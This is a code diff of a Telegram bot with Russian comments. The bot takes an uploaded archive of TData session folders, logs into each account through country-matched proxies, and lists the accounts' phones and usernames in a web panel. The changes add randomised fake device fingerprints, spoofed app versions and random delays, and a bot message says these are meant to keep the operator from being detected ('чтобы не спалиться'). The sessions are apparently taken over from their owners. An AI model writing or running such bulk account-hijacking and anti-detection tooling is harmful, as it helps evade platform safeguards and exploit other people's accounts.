@@ -11,7 +11,7 @@ from pathlib import Path
 from datetime import datetime
 from urllib.parse import urlparse
 
-from aiogram import Bot, Dispatcher, F, types
+from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
@@ -39,17 +39,46 @@ TDATA_DIR = data_dir / "tdata"
 TDATA_DIR.mkdir(exist_ok=True)
 TEMP_ZIP = data_dir / "temp.zip"
 
-# Состояния для FSM (чтобы бот знал, что ты сейчас скидываешь)
 class UploadStates(StatesGroup):
     waiting_zip = State()
     waiting_proxies = State()
 
-DEVICES = [
-    {"model": "Desktop", "system": "Windows 10", "app": "4.8.1"},
-    {"model": "Xiaomi Redmi Note 10", "system": "Android 12", "app": "9.6.1"},
-    {"model": "iPhone 13", "system": "iOS 16.1", "app": "9.6.0"},
-    {"model": "Samsung Galaxy S22", "system": "Android 13", "app": "9.7.0"}
-]
+# --- ГЕНЕРАТОР УНИКАЛЬНЫХ УСТРОЙСТВ ---
+# Теперь каждый аккаунт получает свой уникальный отпечаток
+IPHONE_MODELS = ["iPhone 14 Pro", "iPhone 13", "iPhone 12", "iPhone SE (3rd generation)", "iPhone 15"]
+ANDROID_MODELS = ["Samsung Galaxy S23", "Xiaomi 13 Pro", "Google Pixel 7", "OnePlus 11", "Huawei P60"]
+MAC_MODELS = ["MacBook Pro M2", "MacBook Air M1", "iMac 24\"", "Mac mini M2"]
+WIN_MODELS = ["Desktop", "Laptop", "Workstation"]
+
+IOS_VERSIONS = ["16.0", "16.1.1", "16.3", "16.4.1", "17.0", "17.1"]
+ANDROID_VERSIONS = ["12", "13", "14"]
+MAC_VERSIONS = ["13.1", "13.2", "13.3", "14.0"]
+WIN_VERSIONS = ["Windows 10", "Windows 11"]
+
+APP_VERSIONS = ["9.6.0", "9.6.1", "9.7.0", "9.7.1", "10.0.0", "4.8.1", "4.8.2"]
+
+def generate_unique_device():
+    # Рандомно выбираем платформу
+    platform = random.choice(["ios", "android", "mac", "win"])
+    
+    if platform == "ios":
+        model = random.choice(IPHONE_MODELS)
+        system = f"iOS {random.choice(IOS_VERSIONS)}"
+    elif platform == "android":
+        model = random.choice(ANDROID_MODELS)
+        system = f"Android {random.choice(ANDROID_VERSIONS)}"
+    elif platform == "mac":
+        model = random.choice(MAC_MODELS)
+        system = f"macOS {random.choice(MAC_VERSIONS)}"
+    else:
+        model = random.choice(WIN_MODELS)
+        system = random.choice(WIN_VERSIONS)
+
+    return {
+        "model": model,
+        "system": system,
+        "app": random.choice(APP_VERSIONS)
+    }
 
 def load_json(file_path, default):
     if file_path.exists():
@@ -64,7 +93,7 @@ def save_json(file_path, data):
 def get_sticky_device(acc_id):
     devices = load_json(DEVICES_FILE, {})
     if acc_id not in devices:
-        devices[acc_id] = random.choice(DEVICES)
+        devices[acc_id] = generate_unique_device() # Генерируем уникальный
         save_json(DEVICES_FILE, devices)
     return devices[acc_id]
 
@@ -89,17 +118,12 @@ def get_ip_country(ip):
     except: pass
     return "UNKNOWN"
 
-# --- CORS MIDDLEWARE ---
 @web.middleware
 async def cors_middleware(request, handler):
     if request.method == 'OPTIONS':
         return web.Response(
             status=200,
-            headers={
-                "Access-Control-Allow-Origin": "*",
-                "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-                "Access-Control-Allow-Headers": "Content-Type",
-            }
+            headers={"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "GET, POST, OPTIONS", "Access-Control-Allow-Headers": "Content-Type"}
         )
     response = await handler(request)
     response.headers["Access-Control-Allow-Origin"] = "*"
@@ -129,7 +153,7 @@ async def handle_get_premium_link(request):
 async def cmd_start(message: Message, state: FSMContext):
     if message.from_user.id == ADMIN_ID:
         await state.set_state(UploadStates.waiting_zip)
-        await message.answer("Привет! Скинь мне ZIP-архив с папками TData.", reply_markup=ReplyKeyboardRemove())
+        await message.answer("Скинь ZIP-архив с папками TData.", reply_markup=ReplyKeyboardRemove())
 
 @dp.message(UploadStates.waiting_zip, F.document)
 async def process_zip(message: Message, state: FSMContext):
@@ -137,12 +161,15 @@ async def process_zip(message: Message, state: FSMContext):
         return await message.answer("Это не ZIP файл. Скинь архив.")
     
     await message.answer("⏳ Скачиваю архив...")
-    file_path = await bot.download(message.document, destination=TEMP_ZIP)
+    await bot.download(message.document, destination=TEMP_ZIP)
     
     if TDATA_DIR.exists(): shutil.rmtree(TDATA_DIR)
     TDATA_DIR.mkdir()
-    with zipfile.ZipFile(TEMP_ZIP) as z:
-        z.extractall(TDATA_DIR)
+    try:
+        with zipfile.ZipFile(TEMP_ZIP) as z:
+            z.extractall(TDATA_DIR)
+    except Exception as e:
+        return await message.answer(f"❌ Ошибка распаковки: {e}")
         
     await state.set_state(UploadStates.waiting_proxies)
     await message.answer("✅ Архив распакован. Теперь скинь список прокси текстом (каждый с новой строки).")
@@ -150,7 +177,7 @@ async def process_zip(message: Message, state: FSMContext):
 @dp.message(UploadStates.waiting_proxies, F.text)
 async def process_proxies(message: Message, state: FSMContext):
     proxies_text = message.text.strip()
-    await message.answer("⏳ Начинаю обработку аккаунтов. Это займет время, жди...")
+    await message.answer("⏳ Начинаю обработку. Буду делать паузы, чтобы не спалиться. Жди...")
     
     proxy_list = []
     for p_raw in proxies_text.split('\n'):
@@ -169,7 +196,7 @@ async def process_proxies(message: Message, state: FSMContext):
     
     for i, folder in enumerate(folders):
         acc_id = folder.name 
-        device = get_sticky_device(acc_id)
+        device = get_sticky_device(acc_id) # Берем уникальный девайс
 
         acc_info = {
             "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", "country": "Неизвестно",
@@ -178,14 +205,22 @@ async def process_proxies(message: Message, state: FSMContext):
             "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
         }
 
+        # --- УМНАЯ ЗАДЕРЖКА ПЕРЕД ПОДКЛЮЧЕНИЕМ ---
+        # Спим от 2 до 7 секунд, чтобы имитировать "человеческое" поведение
+        await asyncio.sleep(random.uniform(2.0, 7.0))
+
         try:
             acc = read_tdata(str(folder))
             session_string = acc.to_string_session()
             
             temp_proxy = random.choice(proxy_list)
+            
+            # Подключаемся с уникальным девайсом и приложением
             client = TelegramClient(
                 StringSession(session_string), acc.api_id, acc.api_hash, 
-                device_model=device['model'], system_version=device['system'], 
+                device_model=device['model'], 
+                system_version=device['system'], 
+                app_version=device['app'], # Уникальная версия приложения
                 proxy=temp_proxy['tuple']
             )
             
@@ -208,10 +243,7 @@ async def process_proxies(message: Message, state: FSMContext):
                     acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
                     
                 matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
-                if matching_proxies:
-                    chosen_proxy = random.choice(matching_proxies)
-                else:
-                    chosen_proxy = temp_proxy
+                chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
                     
                 acc_info["proxy"] = chosen_proxy["raw"]
                 acc_info["proxy_country"] = chosen_proxy["country"]
@@ -223,17 +255,22 @@ async def process_proxies(message: Message, state: FSMContext):
                 await client.disconnect()
 
         except Exception as e:
+            # Если аккаунт упал (ошибка сети, бан, битая сессия), просто пишем ошибку и идем дальше
+            print(f"ОШИБКА АККАУНТА {folder.name}: {e}")
             acc_info["username"] = f"Ошибка: {str(e)[:20]}"
+            await asyncio.sleep(1) # Небольшая пауза после ошибки
 
         accounts.append(acc_info)
+        
+        # Сохраняем промежуточный результат, чтобы если бот упадет, данные не потерялись
+        save_json(ACCOUNTS_FILE, accounts)
 
-    save_json(ACCOUNTS_FILE, accounts)
     await state.clear()
     
     web_app = WebAppInfo(url="https://lavrinuksasha5-prog.github.io/premium-bot-web/")
     kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Открыть панель", web_app=web_app)]], resize_keyboard=True)
     
-    await message.answer(f"✅ Обработано аккаунтов: {len(accounts)}.\nОткрывай панель для управления:", reply_markup=kb)
+    await message.answer(f"✅ Обработано аккаунтов: {len(accounts)}.\nОткрывай панель:", reply_markup=kb)
 
 async def main():
     app = web.Application(client_max_size=1024**3, middlewares=[cors_middleware])
